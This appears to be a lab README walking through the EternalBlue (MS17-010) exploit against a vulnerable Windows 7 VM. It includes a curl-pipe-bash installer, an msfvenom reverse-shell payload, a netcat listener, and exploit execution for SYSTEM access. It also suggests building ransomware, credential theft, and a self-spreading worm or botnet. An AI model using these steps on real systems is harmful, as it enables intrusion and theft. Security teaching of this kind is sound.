# EternalBlue

- Built on: Environment: Kali Linux and Vulnerable Windows 7(64bit) VMs (2020.09)

## Preparation

On Linux: `curl -fsSL https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.sh | bash`

On Windows: merge https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.reg ([zip](https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.reg.zip))

## Steps

1. On Windows (`target.example.com`), share a folder (it doesn't matter which folder is shared. We only need to start the file sharing server software)
2. On Linux (`kali.example.com`), prepare a payload and name it `ms17-010.exe`. If you don't have something ready, try the reverse shell and create it with command: `msfvenom -p windows/shell_reverse_tcp LHOST=kali.example.com LPORT=8443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`
3. If you're going with the reverse shell approach, listen on port 443 on Linux in another terminal window: `nc -nlvp 8443`
4. We omit the step to probe the victim and identify the vulnerabilities since we know about it, and directly run the attacking script: `python send_and_execute.py target.example.com ms17-010.exe`
5. Now your payload is running on the victim machine under `NT AUTHORITY\SYSTEM` privilege. We omit the step to verify that. If you're going with the reverse shell approach, You should get an inbound connection on your netcat server listening on port 8443, providing you with a shell (cmd). Every command you enter is executed on the victim machine.

## Exploration

- Inspect the Python scripts and related docs (protocol spec) and try to understand them, including how the smb protocol (Windows file sharing service) and server work, what the flaw is, how it is exploited, and how to fix it, etc.
- Design your own payload (like the ransomware in the news events, but you're not limited to ransomwares and can do anything on the victim. The guide in the reference proceeds with extracting login credentials from the system manually in the reverse shell).
- Think about implementing an exploit inside the payload, and the ability to probe other hosts reachable over the network, attack them and spread itself. This can be used to create a computer worm and/or botnet (discussed elsewhere).

## Reference

- [Exploiting MS17-010 without Metasploit (Win XP SP3)](https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/) 
